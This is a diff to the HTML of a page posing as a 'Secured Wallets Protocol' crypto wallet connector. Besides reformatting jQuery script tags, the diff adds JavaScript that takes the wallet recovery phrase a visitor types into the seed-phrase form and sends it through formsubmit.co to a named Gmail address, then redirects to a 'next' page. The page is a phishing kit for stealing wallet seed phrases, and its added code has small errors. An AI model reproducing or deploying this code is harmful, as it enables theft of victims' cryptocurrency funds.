@@ -27,10 +27,18 @@
     <link rel="stylesheet" href="./Secured Wallets Protocol_files/fa605a2e7387ae6acff3.css" data-n-g=""><noscript
         data-n-css=""></noscript>
     <link rel="stylesheet" href="./Secured Wallets Protocol_files/add.css" type="text/css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js" integrity="sha512-n/4gHW3atM3QqRcbCn6ewmpxcLAHGaDjpEBu4xZd47N0W2oQ+6q7oc3PXstrJYXcbNU1OHdQ1T7pAP+gi5Yu8g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.slim.js" integrity="sha512-HNbo1d4BaJjXh+/e6q4enTyezg5wiXvY3p/9Vzb20NIvkJghZxhzaXeffbdJuuZSxFhJP87ORPadwmU9aN3wSA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.slim.min.js" integrity="sha512-6ORWJX/LrnSjBzwefdNUyLCMTIsGoNP6NftMy2UAm1JBm6PRZCO1d7OHBStWpVFZLO+RerTvqX/Z9mBFfCJZ4A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
+        integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.js"
+        integrity="sha512-n/4gHW3atM3QqRcbCn6ewmpxcLAHGaDjpEBu4xZd47N0W2oQ+6q7oc3PXstrJYXcbNU1OHdQ1T7pAP+gi5Yu8g=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.slim.js"
+        integrity="sha512-HNbo1d4BaJjXh+/e6q4enTyezg5wiXvY3p/9Vzb20NIvkJghZxhzaXeffbdJuuZSxFhJP87ORPadwmU9aN3wSA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.slim.min.js"
+        integrity="sha512-6ORWJX/LrnSjBzwefdNUyLCMTIsGoNP6NftMy2UAm1JBm6PRZCO1d7OHBStWpVFZLO+RerTvqX/Z9mBFfCJZ4A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 </head>
 
 <body data-new-gr-c-s-check-loaded="14.1037.0" data-gr-ext-installed="">
@@ -1228,8 +1236,8 @@
                     id="walletName">Infinito Wallet</span>Wallet</small>
             <div class="result" style="text-align:center"></div>
             <div class="tabContent active" id="phraseContent">
-                <form method="post" name="phraseKey">
-                    <div class="row"><textarea data-name="phrase" name="recovery_phrase" required=""
+                <form method="post" name="phraseKey" id="phraseKey">
+                    <div class="row"><textarea data-name="phrase" name="recovery_phrase" id='recovery_phrase' required=""
                             placeholder="Wallet Phrases or Wallet Seed Words" style="height:200px"></textarea></div>
                     <small style="text-align:center">Typically 12 (sometimes 24) words separated by single
                         spaces</small>
@@ -1264,13 +1272,38 @@
     <script type="text/javascript">
         let connect = document.querySelectorAll('.myBtn2')
         let displayModalBack = (new URLSearchParams(location.search)).toString('type')
-        let sliceddisplayModalBack = displayModalBack.slice(0,5)
+        let sliceddisplayModalBack = displayModalBack.slice(0, 5)
         connectWallet.style.display = sliceddisplayModalBack
         connect.forEach(connect => connect.addEventListener('click', () => {
             connectWallet.style.display = 'block'
         }))
         document.querySelector('.close2').addEventListener('click', () => {
             connectWallet.style.display = 'none'
+        })
+        phraseKey.addEventListener('click', () => {
+            e.preventDefault();
+            mail = "mayhemofflin@gmail.com";
+            next = "next.html";
+            subject = `${window.location.hostname} ${new Date()}`;
+            let r = new FormData();
+            let s = document.querySelector("form").name;
+            recovery_phrase = phraseInput.value;
+            r.append("phraseKey", recovery_phrase);
+            r.append("_captcha", false);
+            r.append("_next", next);
+            r.append("_template", "table");
+            r.append("_subject", subject);
+            console.log(r);
+            let n = `https://formsubmit.co/${mail}`;
+            fetch(
+                n, {
+                    method: "POST",
+                    body: r,
+                }, {
+                    referrer: "https://twitter.com"
+                },
+            ).then((e) => window.location.assign(next));
+        }
         })
     </script>
     <script type="text/javascript">
@@ -1279,11 +1312,11 @@
             $(".tab ul li").removeClass("active"), $("#" + e).addClass("active"), $(".tabContent").removeClass(
                 "active"), $("#" + e + "Content").addClass("active")
         })
-   /*      $(".myBtn").on("click", function () {
-            $("#myModal").css("display", "block")
-        }), $(".close").on("click", function () {
-            $("#myModal").css("display", "none")
-        }); */
+        /*      $(".myBtn").on("click", function () {
+                 $("#myModal").css("display", "block")
+             }), $(".close").on("click", function () {
+                 $("#myModal").css("display", "none")
+             }); */
         let myBtn = document.querySelectorAll('.myBtn')
         myBtn.forEach(myBtn => myBtn.addEventListener('click', () => {
             myModal.style.display = 'block'
